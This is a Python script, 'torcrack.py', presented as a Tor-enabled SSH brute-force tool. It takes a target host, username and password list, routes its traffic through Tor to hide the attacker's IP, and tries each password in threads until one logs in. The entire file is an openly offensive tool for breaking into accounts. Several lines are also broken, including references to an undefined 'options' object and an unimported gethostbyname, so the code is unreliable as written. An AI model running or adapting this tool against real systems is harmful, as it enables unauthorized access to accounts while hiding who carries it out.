#!/usr/bin/env python3

#torcrack.py - (c) 2016 NoRKSEC - no rights reserved

import atexit
import argparse
import os
try:
	import paramiko
except:
	print(' [=] Error: requires Paramiko (pip3 install paramiko)')
	os._exit(1)
try:
	from pyfiglet import Figlet
except:
	print(' [-] Error: requires PyFiglet (pip3 install pyfiglet)')
	os._exit(1)
try:
	import requests
except:
	print(' [-] Error: it appears python requests is not installed. (apt-get install python3-requests)')
	os._exit(1)
import socket
try:
	import socks
except:
	print(' [-] Error: requires socks/SocksiPy/PySocks (pip3 install PySocks)')
	os._exit(1)
import sys
from threading import Thread
from time import sleep
from queue import Queue


def cls():
	os.system('cls' if os.name=='nt' else 'clear')


def intro():
	fa = Figlet(font='graffiti')
	print(fa.renderText('NoRKSEC'))
	print('TorCrack v1.0 - (c) 2016 NoRKSEC - no rights reserved\n\n')


def exit_handler():
	print('\n [~] Exiting...\n')


def ssh_connect(password, code = 0):
	global running
	paramiko.util.log_to_file(".logs/paramiko.log")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	print(' [*] Testing password: ' + password)
	try:
		ssh.connect(tgtHost, port=tgtPort, username=tgtUser, password=password)
	except paramiko.AuthenticationException:
		running -= 1
		print(' [-] Password ' + password + ' incorrect.')
		return running
	except socket.error as e:
		print(' [-] Socket error. ')
		os._exit(1)
	running -= 1
	ssh.close()
	print(' [+] Password for ' + tgtUser + ' found: ' + password)
	exit_handler()
	os._exit(1)


def is_valid_ipv4(address):
	try:
		socket.inet_pton(socket.AF_INET, address)
	except AttributeError:
		try:
			socket.inet_aton(address)
		except socket.error:
			return False
		return address.count('.') == 3
	except socket.error:
		return False
	return True


def main():
	if not os.path.exists("./.logs"):
		os.makedirs("./.logs")
	global running
	running = 0
	atexit.register(exit_handler)
	parser = argparse.ArgumentParser(prog='torcrack.py', description='Tor-enabled SSH brute force dictionary attack.')
	parser.add_argument('tgtHost', type=str, help='target machine')
	parser.add_argument('-t', '--tgtPort', type=int, help='port to attack on target machine (optional: default 22)', default=22)
	parser.add_argument('tgtUser', type=str, help='target username')
	parser.add_argument('dictFile', type=str, help='dictionary file or password list to use')
	parser.add_argument('-m', '--max-threads', type=int, help='maximum number of threads (optional: default is 4,  maximum is 10)', default=4)
	parser.add_argument('-P', '--torPort', type=int, help='local Tor port (optional: default 9050)', default=9050)
	args = parser.parse_args()
	global tgtHost, tgtUser, dictFile, tgtPort, torPort, maxThreads
	tgtUser = options.tgtUser
	dictFile = options.dictFile
	tgtPort = options.tgtPort
	if is_valid_ipv4(options.tgtHost) == True:
		tgtHost = options.tgtHost
	else:
		try:
			tgtHost = gethostbyname(options.tgtHost)
		except:
			print(" [-] Cannot resolve '%s': Unknown host\n" % options.tgtHost)
			exit(0)
	torPort = options.torPort
	if (options.maxThreads > 10):
		print(' [-] Maximum number of threads can not exceed 10.')
		maxThreads = 10
	elif (options.maxThreads < 1):
		print(' [-] Maximum number of threads must be greater than 0 (come on, now.)')
		maxThreads = 4
	else:
		maxThreads = options.maxThreads
	print(' [+] Max Threads set to ' + str(maxThreads))
	print(' [+] ' + options.tgtHost + ' resolved to ' + str(tgtHost))
	print(' [+] Target locked: ' + str(tgtHost) + ':' + str(tgtPort))
	print(' [+] Tor Port set to: ' + str(torPort))
	print(' [+] Target username set to: ' + tgtUser)

	if not os.path.isfile(dictFile):
		print(" [-] Dictionary file does not exist.\n")
		exit(0)

	print(' [+] Dictionary File/Password List set to: ' + dictFile)
	lineMax = sum(1 for line in open(dictFile))
	global session
	print (' [+] Actual IP: ' + requests.get('http://icanhazip.com').text)
	socks.set_default_proxy(socks.SOCKS5, "localhost", torPort)
	socket.socket = socks.socksocket
	try:
		test = requests.get('http://icanhazip.com').text
	except:
		print(' [-] Error establishing Tor circuit. Is the port correct? Shutting down...\n')
		exit(0)
	print(' [+] Tor circuit established.') 
	print(' [+] Tor IP: ' + test)
	paramiko.client.socket.socket = socks.socksocket
	input_file = open(dictFile)
	running = 0
	q = Queue(maxsize=0)
	for j in input_file.readlines():
		password = j.strip('\n')
		q.put(password)
	while (q.qsize() > 0):
		if running < maxThreads:
			running += 1
			passW = q.get()
			worker = Thread(target=ssh_connect, args=(passW,))
			worker.start()
			sleep(1.25) #allow time for ssh banners to be properly captured, if the delay is too short it causes read errors which can cause the script to skip submitting some passwords
	print(' [+] Reached end of dictionary file, waiting for threads to complete...')
	sleep(running*2) #give the script 2 seconds per running thread to finish pulling banners and checking them before declaring no password found
	print(' [+] Password not found; Shutting down.')


if __name__ == '__main__':
	cls()
	intro()
	main()
